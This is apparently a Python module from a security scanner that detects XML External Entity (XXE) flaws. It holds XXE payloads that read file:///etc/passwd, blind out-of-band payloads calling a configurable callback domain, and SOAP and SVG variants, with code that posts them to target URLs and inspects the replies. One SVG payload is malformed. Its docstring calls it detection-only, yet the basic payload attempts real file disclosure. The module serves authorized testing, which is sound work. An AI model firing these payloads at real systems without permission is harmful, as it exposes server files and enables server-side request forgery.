"""
XXE Detector - Identifies XML External Entity vulnerabilities

LEGAL: For authorized security testing ONLY. Detection only - no actual file reading.
"""

import asyncio
import httpx
import re
from typing import Dict, List, Optional
from dataclasses import dataclass
from datetime import datetime
from modules.logging_config import logger


@dataclass
class XXETestResult:
    url: str
    param: str
    vulnerable: bool
    technique: str
    evidence: Dict


class XXEDetector:
    """
    XXE Detector - Identifies XML External Entity vulnerabilities
    
    Detection techniques:
    1. Entity injection testing
    2. Error-based XXE detection
    3. Out-of-band callback detection
    4. Blind XXE detection
    
    This is STANDARD practice - used by all professional scanners
    
    DETECTION ONLY - No actual file exfiltration
    """
    
    def __init__(self, config: Dict):
        self.config = config
        self.timeout = config.get("request_timeout", 15)
        
        # XXE test payloads - detection patterns
        self.test_payloads = {
            # Basic entity test
            "basic_entity": '''<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>''',
            
            # Parameter entity
            "parameter_entity": '''<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
%xxe;
]>''',
            
            # Blind XXE with OOB
            "blind_oob": '''<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY % xxe SYSTEM "http://{OOB_DOMAIN}/test">
%xxe;
]>''',
            
            # Error-based
            "error_based": '''<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY % xxe SYSTEM "file:///etc/nosuchfile">
%xxe;
]>''',
            
            # SSRF disguised as XXE
            "ssrf_like": '''<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "http://{OOB_DOMAIN}/xxe">
]>
<data>&xxe;</data>''',
            
            # SOAP XXE
            "soap": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
<!ENTITY xxe SYSTEM "http://{OOB_DOMAIN}/soap">
]>
<soap:Envelope><soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>''',
            
            # SVG XXE
            "svg_xxe": '''<?xml version="1.0"?>
<!DOCTYPEsvg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>'''
        }
        
        # Common XXE-vulnerable parameters
        self.xxe_params = [
            "xml", "data", "body", "content", "request", "response",
            "xml_data", "xmlmsg", "xoap", "soapaction", "transform",
            "xmlfile", "config", "template", "feed", "widget", "search"
        ]
        
    def generate_oob_payload(self, domain: str, payload_type: str = "blind_oob"):
        """Generate payload with OOB callback"""
        template = self.test_payloads.get(payload_type, "")
        
        if "{OOB_DOMAIN}" in template:
            template = template.replace("{OOB_DOMAIN}", domain)
        
        return template
    
    async def test_xxe_basic(
        self, 
        url: str, 
        param: str,
        session: httpx.AsyncClient,
        oob_domain: str = None
    ) -> Optional[XXETestResult]:
        """Test for basic XXE vulnerability"""
        
        # Test basic entity
        payload = self.test_payloads["basic_entity"]
        
        try:
            response = await session.post(
                url,
                data={param: payload},
                timeout=self.timeout,
                headers={"Content-Type": "application/xml"}
            )
            
            result = await self._analyze_xxe_response(
                url, param, response, "basic_entity"
            )
            
            if result:
                return result
                
        except Exception as e:
            logger.debug(f"XXE test error: {e}")
        
        return None
    
    async def _analyze_xxe_response(
        self, 
        url: str, 
        param: str, 
        response: httpx.Response,
        technique: str
    ) -> Optional[XXETestResult]:
        """Analyze response for XXE indicators"""
        
        response_text = response.text.lower()
        
        # Check for file content in response (classic XXE)
        file_indicators = [
            "root:", "bin:", "daemon:", "/bin/bash",
            "[boot loader]", "[windows]"
        ]
        
        for indicator in file_indicators:
            if indicator in response_text:
                return XXETestResult(
                    url=url,
                    param=param,
                    vulnerable=True,
                    technique=technique,
                    evidence={
                        "type": "file_disclosure",
                        "matched": indicator
                    }
                )
        
        # Check for error messages indicating XXE
        error_indicators = [
            "xml parsing", "xmlerror", "invalid xml",
            "document parse", "entity", "external entity",
            "undeclared entity", "invalid entity"
        ]
        
        for error in error_indicators:
            if error in response_text:
                return XXETestResult(
                    url=url,
                    param=param,
                    vulnerable=True,
                    technique=technique,
                    evidence={
                        "type": "error_message",
                        "matched": error
                    }
                )
        
        # Check for internal path disclosure
        internal_paths = re.findall(r'(?:/etc/|C:\\Windows|/var/|/Users/)[\w/\-.]+', response.text)
        
        if internal_paths:
            return XXETestResult(
                url=url,
                param=param,
                vulnerable=True,
                technique=technique,
                evidence={
                    "type": "path_disclosure",
                    "path": internal_paths[0]
                }
            )
        
        return None
    
    async def test_blind_xxe(
        self,
        url: str,
        param: str,
        session: httpx.AsyncClient,
        oob_domain: str
    ) -> Optional[XXETestResult]:
        """Test for blind XXE using OOB technique"""
        
        payload = self.generate_oob_payload(oob_domain, "blind_oob")
        
        try:
            response = await session.post(
                url,
                data={param: payload},
                timeout=self.timeout,
                headers={"Content-Type": "application/xml"}
            )
            
            # For blind XXE, we send the payload but detection
            # happens via OOB callback server (would be separate)
            # We can only report potential here
            
            return XXETestResult(
                url=url,
                param=param,
                vulnerable=False,  # Would be confirmed by OOB callback
                technique="blind_oob",
                evidence={
                    "sent": True,
                    "note": "Check OOB server for callback"
                }
            )
            
        except Exception as e:
            logger.debug(f"Blind XXE test error: {e}")
        
        return None
    
    async def test_svg_xxe(
        self,
        url: str,
        param: str,
        session: httpx.AsyncClient,
        oob_domain: str = None
    ):
        """Test for XXE in SVG file uploads"""
        
        payload = self.generate_oob_payload(oob_domain or "test.local", "svg_xxe")
        
        files = {"file": ("test.svg", payload, "image/svg+xml")}
        
        try:
            response = await session.post(url, files=files, timeout=self.timeout)
            
            result = await self._analyze_xxe_response(
                url, param, response, "svg_xxe"
            )
            
            return result
            
        except Exception as e:
            logger.debug(f"SVG XXE test error: {e}")
        
        return None
    
    async def scan_endpoint(
        self,
        url: str,
        params: List[str],
        oob_domain: str = None
    ) -> List[Dict]:
        """Comprehensive XXE scan"""
        
        results = []
        
        async with httpx.AsyncClient() as session:
            for param in params:
                logger.info(f"[XXE] Testing {param} at {url}")
                
                # Basic entity test
                result = await self.test_xxe_basic(url, param, session)
                
                if result:
                    results.append({
                        "url": url,
                        "param": param,
                        "vulnerable": result.vulnerable,
                        "technique": result.technique,
                        "evidence": result.evidence
                    })
                
                # If OOB domain provided, test blind XXE
                if oob_domain:
                    blind_result = await self.test_blind_xxe(
                        url, param, session, oob_domain
                    )
                    
                    if blind_result:
                        results.append({
                            "url": url,
                            "param": param,
                            "technique": blind_result.technique,
                            "note": "Requires OOB callback confirmation"
                        })
        
        return results
    
    async def test_xml_endpoint(self, endpoint: Dict) -> List[Dict]:
        """Test XML-handling endpoint"""
        
        return await self.scan_endpoint(
            endpoint.get("url"),
            endpoint.get("params", []),
            self.config.get("oob_domain")
        )


def create_xxe_detector(config: Dict) -> XXEDetector:
    """Factory function"""
    return XXEDetector(config)


if __name__ == "__main__":
    async def test():
        detector = create_xxe_detector({})
        
        # Test basic payload generation
        payload = detector.generate_oob_payload("test.callback.local")
        print(f"OOB payload created (length: {len(payload)})")
        
    asyncio.run(test())